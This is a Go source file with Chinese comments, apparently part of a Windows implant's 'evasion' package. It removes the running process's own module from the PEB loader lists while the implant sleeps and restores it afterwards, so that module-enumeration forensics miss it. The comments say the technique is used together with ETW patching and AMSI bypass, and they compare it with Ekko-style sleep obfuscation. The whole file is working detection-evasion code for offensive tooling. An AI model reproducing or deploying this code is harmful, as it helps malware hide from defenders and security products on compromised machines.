//go:build windows && amd64

// 睡眠期把本进程的镜像从 PEB 模块链表里摘出去（module unlinking）。
//
// 为什么做这件事、而不是 Ekko 式的「加密自身内存镜像」：
// Ekko/Foliage 的做法是在睡眠期用 RC4 加密进程自己的 .text/.rdata，醒来再还原，
// 目的是让内存扫描器扫不到可识别的代码/字符串。这对**自己掌控所有线程**的 C 实现
// 成立，对 Go 不成立：
//   - Go runtime 常驻后台线程（sysmon、GC worker、信号处理）；加密 .text 期间它们
//     随时可能执行被加密的字节 —— 必崩；
//   - 想"先 SuspendThread 把别的线程停住再加密"，在 Go 里会死锁：被挂起的线程可能
//     正持有 mheap/mspan 锁或处于 GC safepoint，主线程随后任何一次分配都会卡住；
//   - 更根本的是 runtime.stopTheWorld 不对外暴露，无法安全地达成"全体停住"。
// 所以这里退一步做**能安全做的那半**：镜像本身不动，只把它从加载器链表里摘掉，
// 让"枚举模块看看有没有可疑 exe"这一类取证在睡眠窗口内看不到我们。
//
// 边界（务必如实告知使用者）：
//   - 只影响 PEB 的三条链表（InLoadOrder/InMemoryOrder/InInitializationOrder），
//     不影响 VAD：按内存区域扫（pe-sieve 一类）仍然看得到文件映射的镜像页；
//   - 摘链期间 GetModuleFileName(NULL)/EnumProcessModules 找不到本模块，所以
//     **只允许在睡眠窗口内摘**，命令执行前必须挂回（否则 os.Executable 一类调用会失效）；
//   - 挂回前校验邻居链接没被别人动过（睡眠期间可能有 DLL 被懒加载/卸载），
//     对不上就退化为"挂到链表尾"，绝不硬写可能已经失效的指针。

package evasion

import (
	"fmt"
	"sync"
	"unsafe"

	"golang.org/x/sys/windows"
)

// PEB / LDR 偏移（x64，Windows 10/11 一致）
const (
	pebLdrOffset = 0x18 // PEB->Ldr
	// PEB_LDR_DATA 三条链表头
	ldrInLoadOrderList      = 0x10
	ldrInMemoryOrderList    = 0x20
	ldrInInitializationList = 0x30
	// LDR_DATA_TABLE_ENTRY 内三条链表的 Links 偏移
	entryInLoadOrderLinks      = 0x00
	entryInMemoryOrderLinks    = 0x10
	entryInInitializationLinks = 0x20
	entryDllBase               = 0x30
)

// ldrList 一条链表：表头地址 + 该链表 Links 在 entry 内的偏移
type ldrList struct {
	head   uintptr // 表头（LIST_ENTRY）
	offset uintptr // entry 内 Links 字段偏移
}

// moduleHideState 摘链状态（用于挂回）
type moduleHideState struct {
	mu     sync.Mutex
	hidden bool
	base   uintptr
	saved  [3]savedLinks
}

// savedLinks 一条链表上摘链前的邻居
type savedLinks struct {
	links uintptr // 本 entry 的 Links 地址
	flink uintptr // 下一个 entry 的 Links
	blink uintptr // 上一个 entry 的 Links
}

var modHide moduleHideState

// readPtr/writePtr 读写任意地址（摘链是对加载器结构直接操作，没有更安全的 API）
func readPtr(addr uintptr) uintptr {
	return *(*uintptr)(unsafe.Pointer(addr))
}

func writePtr(addr, v uintptr) {
	*(*uintptr)(unsafe.Pointer(addr)) = v
}

// selfImageBase 取本进程主模块基址（GetModuleHandleW(NULL)）。
// 注意：加载器链表被摘掉之后这个调用仍能成功 —— 它走的是 PEB->ImageBaseAddress，
// 与模块链表无关；受影响的是 EnumProcessModules / GetModuleFileName(NULL) 一类。
func selfImageBase() (uintptr, error) {
	proc := windows.NewLazySystemDLL("kernel32.dll").NewProc("GetModuleHandleW")
	if err := proc.Find(); err != nil {
		return 0, err
	}
	h, _, _ := proc.Call(0)
	if h == 0 {
		return 0, fmt.Errorf("GetModuleHandleW(NULL) 返回 0")
	}
	return h, nil
}

// currentPEB 取本进程 PEB 地址（NtQueryInformationProcess + ProcessBasicInformation）
func currentPEB() (uintptr, error) {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	proc := ntdll.NewProc("NtQueryInformationProcess")
	if err := proc.Find(); err != nil {
		return 0, fmt.Errorf("解析 NtQueryInformationProcess: %v", err)
	}
	var pbi [6]uintptr
	st, _, _ := proc.Call(uintptr(^uintptr(0)), 0,
		uintptr(unsafe.Pointer(&pbi[0])), unsafe.Sizeof(pbi), 0)
	if st != 0 || pbi[1] == 0 {
		return 0, fmt.Errorf("读取 PEB 失败 (status=0x%x)", st)
	}
	return pbi[1], nil
}

// selfLists 返回本进程三条链表定义
func selfLists(peb uintptr) ([3]ldrList, uintptr, error) {
	ldr := readPtr(peb + pebLdrOffset)
	if ldr == 0 {
		return [3]ldrList{}, 0, fmt.Errorf("PEB->Ldr 为空")
	}
	return [3]ldrList{
		{head: ldr + ldrInLoadOrderList, offset: entryInLoadOrderLinks},
		{head: ldr + ldrInMemoryOrderList, offset: entryInMemoryOrderLinks},
		{head: ldr + ldrInInitializationList, offset: entryInInitializationLinks},
	}, ldr, nil
}

// findSelfEntry 在 InLoadOrder 链表里按 DllBase 找到本模块的 entry 基址
func findSelfEntry(list ldrList, base uintptr) (uintptr, error) {
	head := list.head
	cur := readPtr(head) // 第一个 entry 的 Links 地址
	for i := 0; i < 512 && cur != 0 && cur != head; i++ {
		entry := cur - list.offset
		if readPtr(entry+entryDllBase) == base {
			return entry, nil
		}
		cur = readPtr(cur) // 下一个 Flink
	}
	return 0, fmt.Errorf("模块链表里找不到本模块（base=0x%x）", base)
}

// detachLinks 把 entry 的某条 Links 从链表里摘掉，返回原邻居
func detachLinks(links uintptr) savedLinks {
	flink := readPtr(links)
	blink := readPtr(links + 8)
	if flink != 0 && blink != 0 {
		writePtr(blink, flink)   // prev->Flink = next
		writePtr(flink+8, blink) // next->Blink = prev
	}
	return savedLinks{links: links, flink: flink, blink: blink}
}

// attachLinks 把摘掉的 entry 挂回原位；邻居已被改动时挂到尾部。
//
// 为什么要校验：睡眠窗口可能很长（分钟级），期间任何一次懒加载 DLL 都会改动
// 我们记住的邻居指针。硬写回去会把链表接成环或断链 —— 后果是进程在下次任何
// 一次 LoadLibrary/枚举模块时崩掉，而且现场极难定位。
func attachLinks(s savedLinks, head uintptr) (string, bool) {
	if s.links == 0 || s.flink == 0 || s.blink == 0 {
		return "", false
	}
	if readPtr(s.blink) == s.flink && readPtr(s.flink+8) == s.blink {
		writePtr(s.links, s.flink)
		writePtr(s.links+8, s.blink)
		writePtr(s.blink, s.links)
		writePtr(s.flink+8, s.links)
		return "原位", true
	}
	// 邻居不一致：退化为挂到表尾（head.Blink 是最后一个 entry 的 Links）
	tail := readPtr(head + 8)
	if tail == 0 {
		return "", false
	}
	writePtr(s.links, head)
	writePtr(s.links+8, tail)
	writePtr(tail, s.links)
	writePtr(head+8, s.links)
	return "表尾", true
}

// HideSelfModule 把本模块从 PEB 三条模块链表里摘掉，返回挂回函数。
//
// 返回的挂回函数幂等、可重复调用；摘链失败时返回的闭包是空操作。
func HideSelfModule() (restore func(), err error) {
	modHide.mu.Lock()
	defer modHide.mu.Unlock()
	noop := func() {}
	if modHide.hidden {
		return noop, nil
	}
	h, err := selfImageBase()
	if err != nil || h == 0 {
		return noop, fmt.Errorf("取本模块基址: %v", err)
	}
	base := h
	peb, err := currentPEB()
	if err != nil {
		return noop, err
	}
	lists, _, err := selfLists(peb)
	if err != nil {
		return noop, err
	}
	entry, err := findSelfEntry(lists[0], base)
	if err != nil {
		return noop, err
	}
	for i, l := range lists {
		modHide.saved[i] = detachLinks(entry + l.offset)
	}
	modHide.base = base
	modHide.hidden = true

	return func() { _ = RestoreSelfModule() }, nil
}

// RestoreSelfModule 把本模块挂回 PEB 链表（幂等）。返回错误仅表示未处于摘链状态。
func RestoreSelfModule() error {
	modHide.mu.Lock()
	defer modHide.mu.Unlock()
	if !modHide.hidden {
		return nil
	}
	peb, err := currentPEB()
	if err != nil {
		return err
	}
	lists, _, err := selfLists(peb)
	if err != nil {
		return err
	}
	ok := 0
	for i, l := range lists {
		if _, attached := attachLinks(modHide.saved[i], l.head); attached {
			ok++
		}
	}
	modHide.hidden = false
	if ok != 3 {
		return fmt.Errorf("只挂回 %d/3 条模块链表", ok)
	}
	return nil
}

// SelfModuleHidden 报告当前是否处于摘链状态
func SelfModuleHidden() bool {
	modHide.mu.Lock()
	defer modHide.mu.Unlock()
	return modHide.hidden
}

// HideForSleep 在睡眠窗口内摘链，返回在睡眠结束时调用的挂回函数。
//
// 只在调用方明确开启了主机层对抗（ETW patch / AMSI bypass / syscall 模式之一）时
// 才会真正动手 —— 摘链是"降低可见度"，不该成为默认行为：它以牺牲加载器一致性
// 换取隐蔽性，出问题时的代价（链表异常/进程崩溃）比收益更显眼。
//
// 任何一步失败都返回空操作闭包，绝不让睡眠路径因为隐藏失败而中断。
func HideForSleep(enabled bool) func() {
	if !enabled {
		return func() {}
	}
	restore, err := HideSelfModule()
	if err != nil {
		return func() {}
	}
	return restore
}
